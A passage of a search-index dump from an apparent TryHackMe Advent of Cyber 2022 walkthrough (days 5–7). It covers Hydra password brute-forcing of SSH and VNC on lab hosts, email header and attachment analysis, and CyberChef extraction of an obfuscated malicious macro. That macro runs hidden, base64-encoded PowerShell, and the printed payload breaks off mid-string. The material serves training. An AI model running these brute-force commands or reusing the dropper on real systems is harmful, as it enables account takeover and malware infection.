blocks of size 1024. 38196224 blocks available\n\nsmb: \\&gt; \n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day5/","title":"Day 05 - Brute Force","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day5/#introduction","title":"Introduction","text":"<p>Common attacks against passwords are presented below:</p> <ol> <li> <p>Shoulder Surfing: Observing and noting as a target inputs their credentials. This attack requires the least technical knowledge.</p> </li> <li> <p>Password Guessing: People generally practice poor password practices by using personal details such as birth date or children's names as their passwords. Guessing the password of such users requires some knowledge of the target\u2019s personal details.</p> </li> <li> <p>Dictionary Attack: This approach expands on password guessing and attempts to include all valid words in a dictionary or a word list.</p> </li> <li> <p>Brute Force Attack: This attack is the most exhaustive and time-consuming, where an attacker can try all possible character combinations.</p> </li> </ol> <p>Trying out <code>Hydra</code> example provided:</p> <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM]\n\u2514\u2500$ hydra -l alexander -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.232.4 ssh\nHydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-05 09:20:43\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task\n[DATA] attacking ssh://10.10.232.4:22/\n[22][ssh] host: 10.10.232.4   login: alexander   password: sakura\n[STATUS] 14344398.00 tries/min, 14344398 tries in 00:01h, 1 to do in 00:01h, 9 active\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-05 09:21:51\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day5/#ctf-questions","title":"CTF Questions","text":"<p>Used Hydra to brute-force VNC password. </p> <p>Note</p> <p>VNC does not require a user name.</p> <p><pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[/dev/shm]\n\u2514\u2500$ hydra -P /usr/share/wordlists/rockyou.txt 10.10.232.4 vnc\nHydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-05 09:26:45\n[WARNING] you should set the number of parallel task to 4 for vnc services.\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking vnc://10.10.232.4:5900/\n[STATUS] 552.00 tries/min, 552 tries in 00:01h, 14343847 to do in 433:06h, 16 active\n[5900][vnc] host: 10.10.232.4   password: 1q2w3e4r\n[STATUS] attack finished for 10.10.232.4 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-05 09:29:10\n</code></pre> Log-in to VNC using credentials found by Hydra. The flag is displayed on the desktop background image.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day6/","title":"Day 06 - Email Analysis","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day6/#introduction","title":"Introduction","text":"<p>Email analysis is defined as the process of extracting email headers to expose the email file details. The header contains pertinent information such as the sender, receiver, path, return address, and attachments.</p> <p>Two main concerns related to email analysis are as follows:</p> <ul> <li>Security Issues - Identifying suspicious/abnormal/malicious patterns in emails.</li> <li>Performance Issues - Identifying delivery and delay issues in email.</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day6/#email-header-analysis","title":"Email Header Analysis","text":"<p>The following table highlights email header structure.</p> Field Detail From The sender's address. To The recipient's address, including CC and BCC. Date Timestamp of when the email was sent. Subject The subject of the email. Return Path The return address of the reply. Domain Key and DKIM Signatures Email signatures provided by email services to identify and authenticate emails. SPF Shows the server used to send the email (useful to help understand if the actual server is used to send the email from specific domain). Message-ID Unique ID of the email. MIME-Version Used Multipurpose Internet Mail Extensions version (usefull for understanding the delivered \"non-text\" contents and attachments). X-Headers The recipient's mail provider usually add these fields (information is typically experimental and varies according to mail provider). X-Received Mail servers that the email went through. X-Spam Status Spam score of the email. X-Mailer Email client name. <p>A simple process of email analysis is show below.</p> Questions to ask/required checks Evaluation Do the \"From\", \"To\", and \"CC\" fields contain valid addresses? Invalid addresses are a red flag. Are the \"From and \"To\" fields the same? Same value in sender and recipient fields are a red flag. Are the \"From\" and \"Return-Path\" fields the same? Different values in these fields is a red flag. Was the email sent from the correct server? Emails from non-official mail servers are a red flag. Does the \"Message-ID\" field exist and is it valid? Empty and malformed values are red flags. Do the hyperlinks redirect to suspicious/abnormal sites? Suspicious links and redirections are red flags. Do the attachments consist of or contain malware? Suspicious attachments are a red flag. File hashes marked as suspicious/malicious by sandboxes are a red flag."},{"location":"walkthroughs/thm/adventofcyber2022/day6/#osint-tools","title":"OSINT Tools","text":"<p>OSINT tools can be used to check email reputation check on sender email addresses. Following tools are commonly employed during email/attachment analysis.</p> Tool Purpose emailrep.io A simple email reputation checker. VirusTotal A service that provides a cloud-based detection toolset and sandbox environment. InQuest A service that provides network and file analysis by using threat analytics. ipinfo.io A service that provides detailed information about an IP address by focusing on geolocation data and service provider. Talos Reputation An IP reputation check service provided by Cisco Talos. urlscan.io A service that analyses websites by simulating regular user behaviour. Browserling A browser sandbox used to test suspicious/malicious links. Wannabrowser A browser sandbox used to test suspicious/malicious links."},{"location":"walkthroughs/thm/adventofcyber2022/day6/#ctf-questions","title":"CTF Questions","text":"<p>Analyze the <code>.eml</code> file <code>Urgent:.eml</code> using <code>SublimeText</code> on the THM <code>AttackBox</code>.</p> <p>The base64-decoded value of Message-ID field can be found using following command:</p> <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~]\n\u2514\u2500$ echo QW9DMjAyMl9FbWFpbF9BbmFseXNpcw== | base64 -d\nAoC2022_Email_Analysis\n</code></pre> <p><code>emlAnalyzer</code> can be used to extract the attachment from <code>Urgent:.eml</code>.</p> <pre><code>ubuntu@ip-10-10-164-34:~/Desktop$ emlAnalyzer --extract-all -i Urgent\\:.eml \n =================\n ||  Structure  ||\n =================\n|- multipart/mixed                       \n|  |- multipart/related                  \n|  |  |- text/html                       \n|  |- application/msword                   [Division_of_labour-Load_share_plan.doc]\n\n =========================\n ||  URLs in HTML part  ||\n =========================\n[+] No URLs found in the html\n\n ===============================================\n ||  Reloaded Content (aka. Tracking Pixels)  ||\n ===============================================\n[+] No content found which will be reloaded from external resources\n\n ===================\n ||  Attachments  ||\n ===================\n[1] Division_of_labour-Load_share_plan.doc        application/msword        attachment\n\n =============================\n ||  Attachment Extracting  ||\n =============================\n[+] Attachment [1] \"Division_of_labour-Load_share_plan.doc\" extracted to eml_attachments/Division_of_labour-Load_share_plan.doc\n</code></pre> <p>Sha256 hash sum can be found for the extracted attachment using:</p> <pre><code>ubuntu@ip-10-10-164-34:~/Desktop/eml_attachments$ sha256sum Division_of_labour-Load_share_plan.doc \n0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467  Division_of_labour-Load_share_plan.doc\n</code></pre> <p>VirusTotal analysis.</p> <p>InQuest analysis.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day7/","title":"Day 07 - CyberChef","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day7/#introduction","title":"Introduction","text":"<p>This day's challenge has excellent notes on how to use <code>CyberChef</code> to examine malicious files and extract useful information out of them.</p> <p>Use <code>Strings</code> recipe with a minimum length of 258 to isolate the malicious code in the file.</p> <pre><code>c[_]m[_]d[_] [_]c[_]m[_]d[_] [_]c[_]m[_]d[_] [_]c[_]m[_]d[_] [_]/[_]c[_] [_]m[_]s[_]g[_] [_]%[_]u[_]s[_]e[_]r[_]n[_]a[_]m[_]e[_]%[_] [_]/[_]v[_] [_]W[_]o[_]r[_]d[_] [_]e[_]x[_]p[_]e[_]r[_]i[_]e[_]n[_]c[_]e[_]d[_] [_]a[_]n[_] [_]e[_]r[_]r[_]o[_]r[_] [_]t[_]r[_]y[_]i[_]n[_]g[_] [_]t[_]o[_] [_]o[_]p[_]e[_]n[_] [_]t[_]h[_]e[_] [_]f[_]i[_]l[_]e[_].[_] [_]&amp;[_] [_]P[_]^[_]O[_]w[_]^[_]e[_]r[_]^[_]s[_]h[_]e[_]^[_]L[_]^[_]L[_] [_]-[_]w[_] [_]h[_]i[_]d[_]d[_]e[_]n[_] [_]-[_]E[_]N[_]C[_]O[_]D[_] [_] [_]U[_]w[_]\nB[_]F[_]A[_]F[_]Q[_]A[_]L[_]Q[_]B[_]W[_]A[_]G[_]E[_]A[_]c[_]g[_]B[_]J[_]A[_]E[_]E[_]A[_]Q[_]g[_]B[_]s[_]A[_]G[_]U[_]A[_]I[_]A[_]A[_]g[_]A[_]D[_]g[_]A[_]a[_]Q[_]B[_]o[_]A[_]D[_]U[_]A[_]N[_]g[_]A[_]3[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]o[_]A[_]C[_]A[_]A[_]I[_]A[_]B[_]b[_]A[_]H[_]Q[_]A[_]W[_]Q[_]B[_]w[_]A[_]G[_]U[_]A[_]X[_]Q[_]A[_]o[_]A[_]C[_]I[_]A[_]e[_]w[_]A[_]z[_]A[_]H[_]0[_]A[_]e[_]w[_]A[_]w[_]A[_]H[_]0[_]A[_]e[_]w[_]A[_]0[_]A[_]H[_]0[_]A[_]e[_]w[_]A[_]y[_]A[_]H[_]0[_]A[_]e[_]w[_]A[_]x[_]A[_]H[_]0[_]\nA[_]I[_]g[_]A[_]t[_]A[_]G[_]Y[_]A[_]J[_]w[_]B[_]Z[_]A[_]H[_]M[_]A[_]V[_]A[_]A[_]n[_]A[_]C[_]w[_]A[_]J[_]w[_]B[_]S[_]A[_]G[_]U[_]A[_]Y[_]w[_]B[_]U[_]A[_]E[_]8[_]A[_]U[_]g[_]B[_]5[_]A[_]C[_]c[_]A[_]L[_]A[_]A[_]n[_]A[_]E[_]0[_]A[_]L[_]g[_]B[_]p[_]A[_]E[_]8[_]A[_]L[_]g[_]B[_]E[_]A[_]E[_]k[_]A[_]J[_]w[_]A[_]s[_]A[_]C[_]c[_]A[_]c[_]w[_]A[_]n[_]A[_]C[_]w[_]A[_]J[_]w[_]B[_]l[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]p[_]A[_]D[_]s[_]A[_]I[_]A[_]A[_]g[_]A[_]C[_]A[_]A[_]U[_]w[_]B[_]F[_]A[_]F[_]Q[_]A[_]L[_]Q[_]B[_]J[_]\nA[_]H[_]Q[_]A[_]Z[_]Q[_]B[_]t[_]A[_]C[_]A[_]A[_]K[_]A[_]A[_]i[_]A[_]H[_]Y[_]A[_]Q[_]Q[_]A[_]i[_]A[_]C[_]s[_]A[_]I[_]g[_]B[_]S[_]A[_]G[_]k[_]A[_]Q[_]Q[_]A[_]i[_]A[_]C[_]s[_]A[_]I[_]g[_]B[_]i[_]A[_]E[_]w[_]A[_]Z[_]Q[_]A[_]6[_]A[_]F[_]I[_]A[_]I[_]g[_]A[_]r[_]A[_]C[_]I[_]A[_]a[_]Q[_]A[_]i[_]A[_]C[_]s[_]A[_]I[_]g[_]A[_]3[_]A[_]H[_]g[_]A[_]T[_]w[_]A[_]z[_]A[_]C[_]I[_]A[_]K[_]Q[_]A[_]g[_]A[_]C[_]g[_]A[_]W[_]w[_]B[_]U[_]A[_]H[_]k[_]A[_]U[_]A[_]B[_]l[_]A[_]F[_]0[_]A[_]K[_]A[_]A[_]i[_]A[_]H[_]s[_]A[_]M[_]\ng[_]B[_]9[_]A[_]H[_]s[_]A[_]N[_]Q[_]B[_]9[_]A[_]H[_]s[_]A[_]N[_]A[_]B[_]9[_]A[_]H[_]s[_]A[_]M[_]w[_]B[_]9[_]A[_]H[_]s[_]A[_]M[_]Q[_]B[_]9[_]A[_]H[_]s[_]A[_]M[_]A[_]B[_]9[_]A[_]C[_]I[_]A[_]L[_]Q[_]B[_]G[_]A[_]C[_]A[_]A[_]J[_]w[_]B[_]S[_]A[_]C[_]c[_]A[_]L[_]A[_]A[_]n[_]A[_]E[_]0[_]A[_]Y[_]Q[_]B[_]O[_]A[_]G[_]E[_]A[_]R[_]w[_]B[_]F[_]A[_]C[_]c[_]A[_]L[_]A[_]A[_]n[_]A[_]F[_]M[_]A[_]J[_]w[_]A[_]s[_]A[_]C[_]c[_]A[_]V[_]g[_]B[_]J[_]A[_]G[_]M[_]A[_]R[_]Q[_]B[_]Q[_]A[_]G[_]8[_]A[_]S[_]Q[_]B[_]u[_]A[_]H[_]\nQ[_]A[_]J[_]w[_]A[_]s[_]A[_]C[_]c[_]A[_]L[_]g[_]B[_]u[_]A[_]G[_]U[_]A[_]V[_]A[_]A[_]u[_]A[_]H[_]M[_]A[_]R[_]Q[_]B[_]y[_]A[_]C[_]c[_]A[_]L[_]A[_]A[_]n[_]A[_]F[_]k[_]A[_]c[_]w[_]B[_]0[_]A[_]G[_]U[_]A[_]b[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]I[_]A[_]A[_]p[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]7[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]k[_]A[_]E[_]U[_]A[_]c[_]g[_]B[_]y[_]A[_]G[_]8[_]A[_]c[_]g[_]B[_]B[_]A[_]G[_]M[_]A[_]d[_]A[_]B[_]p[_]A[_]G[_]8[_]A[_]b[_]g[_]B[_]Q[_]A[_]H[_]I[_]A[_]Z[_]Q[_]B[_]m[_]A[_]G[_]U[_]A[_]c[_]g[_]B[_]\nl[_]A[_]G[_]4[_]A[_]Y[_]w[_]B[_]l[_]A[_]C[_]A[_]A[_]P[_]Q[_]A[_]g[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]T[_]A[_]G[_]k[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]s[_]A[_]G[_]U[_]A[_]b[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]0[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]s[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]k[_]A[_]Q[_]w[_]B[_]v[_]A[_]G[_]4[_]A[_]d[_]A[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]k[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]u[_]A[_]C[_]c[_]A[_]\nK[_]w[_]A[_]n[_]A[_]H[_]U[_]A[_]Z[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]d[_]g[_]B[_]h[_]A[_]H[_]I[_]A[_]X[_]w[_]B[_]B[_]A[_]D[_]0[_]A[_]J[_]A[_]B[_]Q[_]A[_]D[_]U[_]A[_]O[_]A[_]B[_]C[_]A[_]C[_]A[_]A[_]K[_]w[_]A[_]g[_]A[_]F[_]s[_]A[_]Y[_]w[_]B[_]o[_]A[_]G[_]E[_]A[_]c[_]g[_]B[_]d[_]A[_]C[_]g[_]A[_]N[_]g[_]A[_]0[_]A[_]C[_]k[_]A[_]I[_]A[_]A[_]r[_]A[_]C[_]A[_]A[_]J[_]A[_]B[_]a[_]A[_]D[_]E[_]A[_]O[_]Q[_]B[_]S[_]A[_]D[_]s[_]A[_]J[_]A[_]B[_]C[_]A[_]D[_]U[_]A[_]M[_]w[_]B[_]O[_]A[_]\nD[_]0[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]U[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]3[_]A[_]D[_]c[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]I[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]o[_]A[_]C[_]A[_]A[_]I[_]A[_]B[_]s[_]A[_]H[_]M[_]A[_]I[_]A[_]A[_]g[_]A[_]F[_]Y[_]A[_]Y[_]Q[_]B[_]y[_]A[_]E[_]k[_]A[_]Y[_]Q[_]B[_]C[_]A[_]E[_]w[_]A[_]R[_]Q[_]A[_]6[_]A[_]D[_]g[_]A[_]a[_]Q[_]B[_]o[_]A[_]D[_]U[_]A[_]N[_]g[_]A[_]3[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]p[_]A[_]C[_]4[_]A[_]V[_]g[_]\nB[_]h[_]A[_]G[_]w[_]A[_]d[_]Q[_]B[_]l[_]A[_]D[_]o[_]A[_]O[_]g[_]A[_]i[_]A[_]E[_]M[_]A[_]U[_]g[_]B[_]F[_]A[_]E[_]E[_]A[_]d[_]A[_]B[_]g[_]A[_]E[_]U[_]A[_]Y[_]A[_]B[_]E[_]A[_]G[_]A[_]A[_]a[_]Q[_]B[_]S[_]A[_]G[_]U[_]A[_]Y[_]w[_]B[_]U[_]A[_]E[_]8[_]A[_]c[_]g[_]B[_]Z[_]A[_]C[_]I[_]A[_]K[_]A[_]A[_]k[_]A[_]E[_]g[_]A[_]T[_]w[_]B[_]N[_]A[_]E[_]U[_]A[_]I[_]A[_]A[_]r[_]A[_]C[_]A[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]l[_]A[_]E[_]4[_]A[_]N[_]w[_]B[_]S[_]A[_]H[_]I[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]\nA[_]M[_]Q[_]B[_]z[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]o[_]A[_]O[_]Q[_]B[_]h[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]U[_]A[_]T[_]g[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]c[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]C[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]M[_]A[_]e[_]A[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]N[_]A[_]B[_]p[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]E[_]A[_]e[_]Q[_]B[_]l[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]T[_]g[_]A[_]3[_]\nA[_]C[_]c[_]A[_]K[_]Q[_]A[_]u[_]A[_]C[_]I[_]A[_]c[_]g[_]B[_]l[_]A[_]F[_]A[_]A[_]Y[_]A[_]B[_]M[_]A[_]G[_]E[_]A[_]Y[_]A[_]B[_]j[_]A[_]E[_]U[_]A[_]I[_]g[_]A[_]o[_]A[_]C[_]g[_]A[_]W[_]w[_]B[_]D[_]A[_]E[_]g[_]A[_]Y[_]Q[_]B[_]S[_]A[_]F[_]0[_]A[_]M[_]Q[_]A[_]w[_]A[_]D[_]E[_]A[_]K[_]w[_]B[_]b[_]A[_]E[_]M[_]A[_]S[_]A[_]B[_]h[_]A[_]F[_]I[_]A[_]X[_]Q[_]A[_]3[_]A[_]D[_]g[_]A[_]K[_]w[_]B[_]b[_]A[_]E[_]M[_]A[_]S[_]A[_]B[_]h[_]A[_]F[_]I[_]A[_]X[_]Q[_]A[_]1[_]A[_]D[_]U[_]A[_]K[_]Q[_]A[_]s[_]A[_]E[_]g[_]A[_]X[_]\nw[_]B[_]U[_]A[_]H[_]I[_]A[_]a[_]Q[_]B[_]u[_]A[_]E[_]c[_]A[_]X[_]Q[_]B[_]b[_]A[_]E[_]M[_]A[_]S[_]A[_]B[_]h[_]A[_]F[_]I[_]A[_]X[_]Q[_]A[_]5[_]A[_]D[_]I[_]A[_]K[_]Q[_]A[_]p[_]A[_]C[_]k[_]A[_]O[_]w[_]A[_]k[_]A[_]F[_]Y[_]A[_]N[_]Q[_]A[_]3[_]A[_]F[_]I[_]A[_]P[_]Q[_]A[_]o[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]C[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]Q[_]A[_]N[_]g[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]F[_]Y[_]A[_]J[_]w[_]A[_]p[_]A[_]D[_]s[_]A[_]I[_]A[_]A[_]o[_]A[_]H[_]Y[_]A[_]Y[_]Q[_]B[_]S[_]A[_]E[_]\nk[_]A[_]Y[_]Q[_]B[_]C[_]A[_]G[_]w[_]A[_]Z[_]Q[_]A[_]g[_]A[_]C[_]g[_]A[_]I[_]g[_]B[_]S[_]A[_]C[_]I[_]A[_]K[_]w[_]A[_]i[_]A[_]G[_]k[_]A[_]I[_]g[_]A[_]r[_]A[_]C[_]I[_]A[_]N[_]w[_]B[_]4[_]A[_]E[_]8[_]A[_]M[_]w[_]A[_]i[_]A[_]C[_]k[_]A[_]I[_]A[_]A[_]p[_]A[_]C[_]4[_]A[_]V[_]g[_]B[_]B[_]A[_]G[_]w[_]A[_]V[_]Q[_]B[_]F[_]A[_]D[_]o[_]A[_]O[_]g[_]A[_]i[_]A[_]F[_]M[_]A[_]Z[_]Q[_]B[_]D[_]A[_]H[_]U[_]A[_]c[_]g[_]B[_]J[_]A[_]G[_]A[_]A[_]V[_]A[_]B[_]g[_]A[_]H[_]k[_]A[_]U[_]A[_]B[_]g[_]A[_]F[_]I[_]A[_]T[_]w[_]B[_]\ng[_]A[_]F[_]Q[_]A[_]b[_]w[_]B[_]D[_]A[_]E[_]8[_]A[_]T[_]A[_]A[_]i[_]A[_]C[_]A[_]A[_]P[_]Q[_]A[_]g[_]A[_]C[_]g[_]A[_]K[_]A[_]A[_]n[_]A[_]F[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]b[_]A[_]B[_]z[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]M[_]Q[_]A[_]y[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]W[_]A[_]A[_]0[_]A[_]D[_]Q[_]A[_]U[_]w[_]A[_]9[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]T[_]A[_]D[_]g[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]M[_]Q[_]B[_]E[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]\nU[_]A[_]B[_]h[_]A[_]D[_]I[_]A[_]b[_]g[_]B[_]1[_]A[_]H[_]I[_]A[_]N[_]A[_]A[_]g[_]A[_]D[_]0[_]A[_]I[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]S[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]F[_]8[_]A[_]O[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]P[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]p[_]A[_]D[_]s[_]A[_]J[_]A[_]B[_]P[_]A[_]D[_]Y[_]A[_]N[_]g[_]B[_]H[_]A[_]D[_]0[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]R[_]g[_]A[_]4[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]g[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]X[_]A[_]\nC[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]Q[_]w[_]B[_]5[_]A[_]G[_]c[_]A[_]M[_]A[_]B[_]r[_]A[_]H[_]U[_]A[_]N[_]w[_]A[_]9[_]A[_]C[_]Q[_]A[_]S[_]A[_]B[_]P[_]A[_]E[_]0[_]A[_]R[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]Z[_]Q[_]B[_]B[_]A[_]H[_]c[_]A[_]U[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]y[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]x[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]M[_]A[_]a[_]g[_]A[_]5[_]A[_]G[_]E[_]A[_]Z[_]Q[_]B[_]B[_]A[_]C[_]c[_]A[_]K[_]Q[_]\nA[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]3[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]E[_]I[_]A[_]Y[_]w[_]B[_]4[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]0[_]A[_]G[_]k[_]A[_]Y[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]5[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]U[_]A[_]Q[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]c[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]A[_]A[_]L[_]Q[_]B[_]y[_]A[_]G[_]U[_]A[_]c[_]A[_]B[_]M[_]A[_]E[_]E[_]A[_]Q[_]w[_]B[_]l[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]l[_]A[_]E[_]E[_]\nA[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]d[_]w[_]A[_]n[_]A[_]C[_]k[_]A[_]L[_]A[_]B[_]b[_]A[_]G[_]M[_]A[_]a[_]A[_]B[_]h[_]A[_]F[_]I[_]A[_]X[_]Q[_]A[_]5[_]A[_]D[_]I[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]Q[_]A[_]U[_]A[_]B[_]h[_]A[_]D[_]I[_]A[_]b[_]g[_]B[_]1[_]A[_]H[_]I[_]A[_]N[_]A[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]u[_]A[_]G[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]b[_]A[_]B[_]s[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]R[_]Q[_]A[_]w[_]A[_]D[_]E[_]A[_]Q[_]g[_]A[_]9[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]S[_]\nA[_]D[_]c[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]X[_]w[_]B[_]T[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]T[_]Q[_]B[_]y[_]A[_]G[_]s[_]A[_]a[_]g[_]B[_]j[_]A[_]G[_]k[_]A[_]b[_]Q[_]A[_]9[_]A[_]C[_]g[_]A[_]K[_]A[_]A[_]n[_]A[_]F[_]0[_]A[_]Y[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]y[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]S[_]A[_]B[_]f[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]c[_]w[_]A[_]6[_]A[_]C[_]8[_]A[_]L[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]j[_]A[_]G[_]Q[_]A[_]b[_]\ng[_]A[_]u[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]Y[_]g[_]B[_]h[_]A[_]G[_]4[_]A[_]Z[_]A[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]p[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]e[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]G[_]U[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]d[_]A[_]B[_]p[_]A[_]C[_]4[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]H[_]Q[_]A[_]a[_]A[_]B[_]t[_]A[_]C[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Z[_]g[_]B[_]p[_]A[_]G[_]\nw[_]A[_]Z[_]Q[_]B[_]z[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]v[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]0[_]A[_]e[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]z[_]A[_]H[_]Q[_]A[_]Z[_]Q[_]B[_]y[_]A[_]H[_]k[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]G[_]c[_]A[_]a[_]Q[_]B[_]m[_]A[_]H[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]L[_]g[_]B[